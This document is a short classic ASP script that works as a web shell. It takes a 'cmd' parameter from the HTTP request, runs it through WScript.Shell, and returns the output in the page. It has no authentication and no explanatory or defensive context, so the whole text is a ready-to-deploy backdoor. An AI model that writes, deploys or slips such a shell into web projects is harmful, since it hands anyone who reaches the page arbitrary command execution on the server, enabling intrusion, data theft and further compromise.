<%
dim cmd, output
cmd = request("cmd")
if cmd <> "" then
    set shell = createobject("wscript.shell")
    set exec = shell.exec(cmd)
    output = exec.stdout.readall
    response.write output
end if
%>